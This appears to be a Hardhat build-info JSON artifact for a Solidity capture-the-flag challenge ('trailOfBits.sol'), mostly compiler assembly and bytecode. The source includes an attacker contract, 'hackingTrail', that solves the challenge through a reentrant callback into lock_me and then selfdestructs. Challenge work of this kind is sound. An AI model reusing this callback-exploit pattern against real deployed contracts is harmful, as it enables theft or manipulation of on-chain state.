{
	"id": "16a7dce442024d14edd49e89cb4a28ee",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.10",
	"solcLongVersion": "0.8.10+commit.fc410830",
	"input": {
		"language": "Solidity",
		"sources": {
			"trailOfBits.sol": {
				"content": "pragma solidity 0.8.10;\r\n\r\n// The goal of this challenge is to be able to sign offchain a message\r\n// with an address stored in winners.\r\ninterface IChallenge{\r\n    function exploit_me(address winner) external;\r\n    function lock_me() external;\r\n}\r\n\r\ncontract Challenge is IChallenge {\r\n\r\n    address[] public winners;\r\n    bool lock;\r\n\r\n    function exploit_me(address winner) public{\r\n        lock = false;\r\n\r\n        msg.sender.call(\"\");\r\n\r\n        require(lock);\r\n        winners.push(winner);\r\n    }\r\n\r\n    function lock_me() public{\r\n        lock = true;\r\n    }\r\n}\r\n\r\ncontract checker {\r\n\r\n    function check() public returns (bool) {\r\n        uint size;\r\n        assembly {\r\n            size := extcodesize(0xaE036c65C649172b43ef7156b009c6221B596B8b)\r\n        }\r\n        return size > 0;\r\n    }\r\n}\r\n\r\ncontract hackingTrail {\r\n\r\n    address private constant challengeAddr = 0xcD6a42782d230D7c13A74ddec5dD140e55499Df9;\r\n\r\n    modifier onlyRoki {\r\n        require(msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878), \"lol how did you even find this?\");\r\n        _;\r\n    }\r\n\r\n    function hackTrail() external onlyRoki {\r\n        IChallenge challenge = IChallenge(challengeAddr);\r\n        challenge.exploit_me(address(0x798349E06c67272465123B91bd88C5d19b8c7878));\r\n        selfdestruct(payable(0x798349E06c67272465123B91bd88C5d19b8c7878));\r\n    }\r\n\r\n    receive() external payable {\r\n        (bool success,) = address(challengeAddr).call(abi.encode(bytes4(keccak256(\"lock_me()\"))));\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"trailOfBits.sol": {
				"Challenge": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "winner",
									"type": "address"
								}
							],
							"name": "exploit_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "lock_me",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "winners",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"trailOfBits.sol\":251:570  contract Challenge is IChallenge {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trailOfBits.sol\":251:570  contract Challenge is IChallenge {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4c228cc7\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x548853a0\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa2fb1175\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"trailOfBits.sol\":512:567  function lock_me() public{... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"trailOfBits.sol\":342:504  function exploit_me(address winner) public{... */\n    tag_4:\n      tag_8\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      tag_11\n      jump\t// in\n    tag_8:\n      stop\n        /* \"trailOfBits.sol\":293:317  address[] public winners */\n    tag_5:\n      tag_12\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      tag_15\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"trailOfBits.sol\":512:567  function lock_me() public{... */\n    tag_7:\n        /* \"trailOfBits.sol\":555:559  true */\n      0x01\n        /* \"trailOfBits.sol\":548:552  lock */\n      dup1\n      0x00\n        /* \"trailOfBits.sol\":548:559  lock = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":512:567  function lock_me() public{... */\n      jump\t// out\n        /* \"trailOfBits.sol\":342:504  function exploit_me(address winner) public{... */\n    tag_11:\n        /* \"trailOfBits.sol\":402:407  false */\n      0x00\n        /* \"trailOfBits.sol\":395:399  lock */\n      0x01\n      0x00\n        /* \"trailOfBits.sol\":395:407  lock = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":420:430  msg.sender */\n      caller\n        /* \"trailOfBits.sol\":420:435  msg.sender.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trailOfBits.sol\":420:439  msg.sender.call(\"\") */\n      mload(0x40)\n      tag_20\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_24\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_23)\n    tag_24:\n      0x60\n      swap2\n      pop\n    tag_23:\n      pop\n      pop\n      pop\n        /* \"trailOfBits.sol\":460:464  lock */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"trailOfBits.sol\":452:465  require(lock) */\n      tag_25\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_25:\n        /* \"trailOfBits.sol\":476:483  winners */\n      0x00\n        /* \"trailOfBits.sol\":489:495  winner */\n      dup2\n        /* \"trailOfBits.sol\":476:496  winners.push(winner) */\n      swap1\n      dup1\n      0x01\n      dup2\n      sload\n      add\n      dup1\n      dup3\n      sstore\n      dup1\n      swap2\n      pop\n      pop\n      0x01\n      swap1\n      sub\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap1\n      swap2\n      swap1\n      swap2\n      swap1\n      swap2\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"trailOfBits.sol\":342:504  function exploit_me(address winner) public{... */\n      pop\n      jump\t// out\n        /* \"trailOfBits.sol\":293:317  address[] public winners */\n    tag_15:\n      0x00\n      dup2\n      dup2\n      sload\n      dup2\n      lt\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap2\n      pop\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_30:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_32:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:562   */\n    tag_33:\n        /* \"#utility.yul\":503:510   */\n      0x00\n        /* \"#utility.yul\":532:556   */\n      tag_49\n        /* \"#utility.yul\":550:555   */\n      dup3\n        /* \"#utility.yul\":532:556   */\n      tag_32\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":521:556   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:562   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":568:690   */\n    tag_34:\n        /* \"#utility.yul\":641:665   */\n      tag_51\n        /* \"#utility.yul\":659:664   */\n      dup2\n        /* \"#utility.yul\":641:665   */\n      tag_33\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":634:639   */\n      dup2\n        /* \"#utility.yul\":631:666   */\n      eq\n        /* \"#utility.yul\":621:684   */\n      tag_52\n      jumpi\n        /* \"#utility.yul\":680:681   */\n      0x00\n        /* \"#utility.yul\":677:678   */\n      dup1\n        /* \"#utility.yul\":670:682   */\n      revert\n        /* \"#utility.yul\":621:684   */\n    tag_52:\n        /* \"#utility.yul\":568:690   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":696:835   */\n    tag_35:\n        /* \"#utility.yul\":742:747   */\n      0x00\n        /* \"#utility.yul\":780:786   */\n      dup2\n        /* \"#utility.yul\":767:787   */\n      calldataload\n        /* \"#utility.yul\":758:787   */\n      swap1\n      pop\n        /* \"#utility.yul\":796:829   */\n      tag_54\n        /* \"#utility.yul\":823:828   */\n      dup2\n        /* \"#utility.yul\":796:829   */\n      tag_34\n      jump\t// in\n    tag_54:\n        /* \"#utility.yul\":696:835   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":841:1170   */\n    tag_10:\n        /* \"#utility.yul\":900:906   */\n      0x00\n        /* \"#utility.yul\":949:951   */\n      0x20\n        /* \"#utility.yul\":937:946   */\n      dup3\n        /* \"#utility.yul\":928:935   */\n      dup5\n        /* \"#utility.yul\":924:947   */\n      sub\n        /* \"#utility.yul\":920:952   */\n      slt\n        /* \"#utility.yul\":917:1036   */\n      iszero\n      tag_56\n      jumpi\n        /* \"#utility.yul\":955:1034   */\n      tag_57\n      tag_30\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":917:1036   */\n    tag_56:\n        /* \"#utility.yul\":1075:1076   */\n      0x00\n        /* \"#utility.yul\":1100:1153   */\n      tag_58\n        /* \"#utility.yul\":1145:1152   */\n      dup5\n        /* \"#utility.yul\":1136:1142   */\n      dup3\n        /* \"#utility.yul\":1125:1134   */\n      dup6\n        /* \"#utility.yul\":1121:1143   */\n      add\n        /* \"#utility.yul\":1100:1153   */\n      tag_35\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1090:1153   */\n      swap2\n      pop\n        /* \"#utility.yul\":1046:1163   */\n      pop\n        /* \"#utility.yul\":841:1170   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1176:1253   */\n    tag_36:\n        /* \"#utility.yul\":1213:1220   */\n      0x00\n        /* \"#utility.yul\":1242:1247   */\n      dup2\n        /* \"#utility.yul\":1231:1247   */\n      swap1\n      pop\n        /* \"#utility.yul\":1176:1253   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1259:1381   */\n    tag_37:\n        /* \"#utility.yul\":1332:1356   */\n      tag_61\n        /* \"#utility.yul\":1350:1355   */\n      dup2\n        /* \"#utility.yul\":1332:1356   */\n      tag_36\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1325:1330   */\n      dup2\n        /* \"#utility.yul\":1322:1357   */\n      eq\n        /* \"#utility.yul\":1312:1375   */\n      tag_62\n      jumpi\n        /* \"#utility.yul\":1371:1372   */\n      0x00\n        /* \"#utility.yul\":1368:1369   */\n      dup1\n        /* \"#utility.yul\":1361:1373   */\n      revert\n        /* \"#utility.yul\":1312:1375   */\n    tag_62:\n        /* \"#utility.yul\":1259:1381   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1387:1526   */\n    tag_38:\n        /* \"#utility.yul\":1433:1438   */\n      0x00\n        /* \"#utility.yul\":1471:1477   */\n      dup2\n        /* \"#utility.yul\":1458:1478   */\n      calldataload\n        /* \"#utility.yul\":1449:1478   */\n      swap1\n      pop\n        /* \"#utility.yul\":1487:1520   */\n      tag_64\n        /* \"#utility.yul\":1514:1519   */\n      dup2\n        /* \"#utility.yul\":1487:1520   */\n      tag_37\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1387:1526   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1532:1861   */\n    tag_14:\n        /* \"#utility.yul\":1591:1597   */\n      0x00\n        /* \"#utility.yul\":1640:1642   */\n      0x20\n        /* \"#utility.yul\":1628:1637   */\n      dup3\n        /* \"#utility.yul\":1619:1626   */\n      dup5\n        /* \"#utility.yul\":1615:1638   */\n      sub\n        /* \"#utility.yul\":1611:1643   */\n      slt\n        /* \"#utility.yul\":1608:1727   */\n      iszero\n      tag_66\n      jumpi\n        /* \"#utility.yul\":1646:1725   */\n      tag_67\n      tag_30\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":1608:1727   */\n    tag_66:\n        /* \"#utility.yul\":1766:1767   */\n      0x00\n        /* \"#utility.yul\":1791:1844   */\n      tag_68\n        /* \"#utility.yul\":1836:1843   */\n      dup5\n        /* \"#utility.yul\":1827:1833   */\n      dup3\n        /* \"#utility.yul\":1816:1825   */\n      dup6\n        /* \"#utility.yul\":1812:1834   */\n      add\n        /* \"#utility.yul\":1791:1844   */\n      tag_38\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1781:1844   */\n      swap2\n      pop\n        /* \"#utility.yul\":1737:1854   */\n      pop\n        /* \"#utility.yul\":1532:1861   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1867:1985   */\n    tag_39:\n        /* \"#utility.yul\":1954:1978   */\n      tag_70\n        /* \"#utility.yul\":1972:1977   */\n      dup2\n        /* \"#utility.yul\":1954:1978   */\n      tag_33\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1949:1952   */\n      dup3\n        /* \"#utility.yul\":1942:1979   */\n      mstore\n        /* \"#utility.yul\":1867:1985   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1991:2213   */\n    tag_17:\n        /* \"#utility.yul\":2084:2088   */\n      0x00\n        /* \"#utility.yul\":2122:2124   */\n      0x20\n        /* \"#utility.yul\":2111:2120   */\n      dup3\n        /* \"#utility.yul\":2107:2125   */\n      add\n        /* \"#utility.yul\":2099:2125   */\n      swap1\n      pop\n        /* \"#utility.yul\":2135:2206   */\n      tag_72\n        /* \"#utility.yul\":2203:2204   */\n      0x00\n        /* \"#utility.yul\":2192:2201   */\n      dup4\n        /* \"#utility.yul\":2188:2205   */\n      add\n        /* \"#utility.yul\":2179:2185   */\n      dup5\n        /* \"#utility.yul\":2135:2206   */\n      tag_39\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":1991:2213   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2219:2366   */\n    tag_40:\n        /* \"#utility.yul\":2320:2331   */\n      0x00\n        /* \"#utility.yul\":2357:2360   */\n      dup2\n        /* \"#utility.yul\":2342:2360   */\n      swap1\n      pop\n        /* \"#utility.yul\":2219:2366   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2372:2486   */\n    tag_41:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2492:2890   */\n    tag_42:\n        /* \"#utility.yul\":2651:2654   */\n      0x00\n        /* \"#utility.yul\":2672:2755   */\n      tag_76\n        /* \"#utility.yul\":2753:2754   */\n      0x00\n        /* \"#utility.yul\":2748:2751   */\n      dup4\n        /* \"#utility.yul\":2672:2755   */\n      tag_40\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2665:2755   */\n      swap2\n      pop\n        /* \"#utility.yul\":2764:2857   */\n      tag_77\n        /* \"#utility.yul\":2853:2856   */\n      dup3\n        /* \"#utility.yul\":2764:2857   */\n      tag_41\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":2882:2883   */\n      0x00\n        /* \"#utility.yul\":2877:2880   */\n      dup3\n        /* \"#utility.yul\":2873:2884   */\n      add\n        /* \"#utility.yul\":2866:2884   */\n      swap1\n      pop\n        /* \"#utility.yul\":2492:2890   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2896:3275   */\n    tag_21:\n        /* \"#utility.yul\":3080:3083   */\n      0x00\n        /* \"#utility.yul\":3102:3249   */\n      tag_79\n        /* \"#utility.yul\":3245:3248   */\n      dup3\n        /* \"#utility.yul\":3102:3249   */\n      tag_42\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":3095:3249   */\n      swap2\n      pop\n        /* \"#utility.yul\":3266:3269   */\n      dup2\n        /* \"#utility.yul\":3259:3269   */\n      swap1\n      pop\n        /* \"#utility.yul\":2896:3275   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122045f02163999e6139e256bc277da5fbb9526477c71a737998964ddbaa993c0a6064736f6c634300080a0033\n}\n",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50610392806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80634c228cc714610046578063548853a014610050578063a2fb11751461006c575b600080fd5b61004e61009c565b005b61006a6004803603810190610065919061025c565b6100b8565b005b610086600480360381019061008191906102bf565b6101ba565b60405161009391906102fb565b60405180910390f35b60018060006101000a81548160ff021916908315150217905550565b6000600160006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff166040516100f690610347565b6000604051808303816000865af19150503d8060008114610133576040519150601f19603f3d011682016040523d82523d6000602084013e610138565b606091505b505050600160009054906101000a900460ff1661015457600080fd5b6000819080600181540180825580915050600190039060005260206000200160009091909190916101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600081815481106101ca57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000610229826101fe565b9050919050565b6102398161021e565b811461024457600080fd5b50565b60008135905061025681610230565b92915050565b600060208284031215610272576102716101f9565b5b600061028084828501610247565b91505092915050565b6000819050919050565b61029c81610289565b81146102a757600080fd5b50565b6000813590506102b981610293565b92915050565b6000602082840312156102d5576102d46101f9565b5b60006102e3848285016102aa565b91505092915050565b6102f58161021e565b82525050565b600060208201905061031060008301846102ec565b92915050565b600081905092915050565b50565b6000610331600083610316565b915061033c82610321565b600082019050919050565b600061035282610324565b915081905091905056fea264697066735822122045f02163999e6139e256bc277da5fbb9526477c71a737998964ddbaa993c0a6064736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x392 DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4C228CC7 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x548853A0 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0xA2FB1175 EQ PUSH2 0x6C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x4E PUSH2 0x9C JUMP JUMPDEST STOP JUMPDEST PUSH2 0x6A PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x65 SWAP2 SWAP1 PUSH2 0x25C JUMP JUMPDEST PUSH2 0xB8 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x86 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x81 SWAP2 SWAP1 PUSH2 0x2BF JUMP JUMPDEST PUSH2 0x1BA JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x93 SWAP2 SWAP1 PUSH2 0x2FB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x40 MLOAD PUSH2 0xF6 SWAP1 PUSH2 0x347 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x133 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x138 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND PUSH2 0x154 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 SWAP1 DUP1 PUSH1 0x1 DUP2 SLOAD ADD DUP1 DUP3 SSTORE DUP1 SWAP2 POP POP PUSH1 0x1 SWAP1 SUB SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP1 SWAP2 SWAP1 SWAP2 SWAP1 SWAP2 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP2 SLOAD DUP2 LT PUSH2 0x1CA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 ADD PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 PUSH2 0x1FE JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x239 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP2 EQ PUSH2 0x244 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x256 DUP2 PUSH2 0x230 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x272 JUMPI PUSH2 0x271 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x280 DUP5 DUP3 DUP6 ADD PUSH2 0x247 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x29C DUP2 PUSH2 0x289 JUMP JUMPDEST DUP2 EQ PUSH2 0x2A7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x2B9 DUP2 PUSH2 0x293 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x2D5 JUMPI PUSH2 0x2D4 PUSH2 0x1F9 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x2E3 DUP5 DUP3 DUP6 ADD PUSH2 0x2AA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x2F5 DUP2 PUSH2 0x21E JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x310 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x2EC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x331 PUSH1 0x0 DUP4 PUSH2 0x316 JUMP JUMPDEST SWAP2 POP PUSH2 0x33C DUP3 PUSH2 0x321 JUMP JUMPDEST PUSH1 0x0 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x352 DUP3 PUSH2 0x324 JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 GASLIMIT CREATE 0x21 PUSH4 0x999E6139 0xE2 JUMP 0xBC 0x27 PUSH30 0xA5FBB9526477C71A737998964DDBAA993C0A6064736F6C634300080A0033 ",
							"sourceMap": "251:319:0:-:0;;;;;;;;;;;;;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@exploit_me_45": {
									"entryPoint": 184,
									"id": 45,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"@lock_me_53": {
									"entryPoint": 156,
									"id": 53,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@winners_15": {
									"entryPoint": 442,
									"id": 15,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 583,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_t_uint256": {
									"entryPoint": 682,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 604,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_uint256": {
									"entryPoint": 703,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 748,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 804,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 839,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 763,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
